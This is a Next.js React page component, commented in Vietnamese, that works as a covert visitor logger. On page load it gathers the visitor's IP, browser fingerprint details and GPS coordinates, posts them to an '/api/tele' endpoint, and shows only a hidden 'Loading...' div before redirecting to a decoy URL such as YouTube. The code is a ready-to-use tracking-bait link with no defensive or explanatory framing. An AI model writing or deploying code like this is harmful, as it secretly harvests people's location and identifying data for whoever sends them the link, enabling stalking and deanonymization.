"use client";

import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    async function sendData() {
      try {
        // Lấy IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // Chuẩn bị data cơ bản
        const payload: any = {
          ip: ipData.ip,
          userAgent: navigator.userAgent,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: `${window.screen.width}x${window.screen.height}`,
          referrer: document.referrer || "none",
          network: (navigator as any).connection?.effectiveType || "unknown",
          platform: navigator.platform,
        };

        // Xin quyền vị trí
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            payload.location = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
            };

            // Gửi về API
            await fetch("/api/tele", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });

            // Chỉ redirect khi có location
            window.location.href = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://youtube.com";
          },
          async () => {
            // Nếu từ chối location → vẫn gửi data nhưng không redirect
            await fetch("/api/tele", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
          }
        );
      } catch (err) {
        console.error("Error sending data:", err);
      }
    }

    sendData();
  }, []);

  return <div className="hidden">Loading...</div>;
}
